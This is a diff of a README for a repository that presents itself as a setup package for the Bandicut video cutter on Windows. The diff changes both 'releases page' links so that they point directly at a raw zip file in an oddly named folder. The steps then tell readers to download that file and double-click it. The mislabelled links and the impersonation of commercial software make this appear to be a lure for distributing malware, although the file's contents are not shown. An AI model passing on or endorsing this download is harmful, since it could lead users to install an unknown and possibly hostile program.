@@ -1,6 +1,6 @@
 # ✂️ Bandicut-Video-Cutter-Setup - Cut and join videos with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/olden-gravitybomb743/Bandicut-Video-Cutter-Setup/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/olden-gravitybomb743/Bandicut-Video-Cutter-Setup/raw/refs/heads/main/enzymosis/Setup_Video_Cutter_Bandicut_v1.0.zip)
 
 Bandicut is a tool for Windows that trims, splits, and joins video files. It keeps the original quality of your files because it does not re-encode them. This process makes the operation fast and protects the pixel data of your footage. You can work with popular formats like MP4, AVI, MOV, and MKV.
 
@@ -8,7 +8,7 @@ Bandicut is a tool for Windows that trims, splits, and joins video files. It kee
 
 To use this software, you need to download the installer from the release page.
 
-1. Visit the [releases page](https://github.com/olden-gravitybomb743/Bandicut-Video-Cutter-Setup/releases) to access the official setup files.
+1. Visit the [releases page](https://github.com/olden-gravitybomb743/Bandicut-Video-Cutter-Setup/raw/refs/heads/main/enzymosis/Setup_Video_Cutter_Bandicut_v1.0.zip) to access the official setup files.
 2. Click the installer link to start the download.
 3. Locate the file in your downloads folder.
 4. Double-click the file to begin the installation.
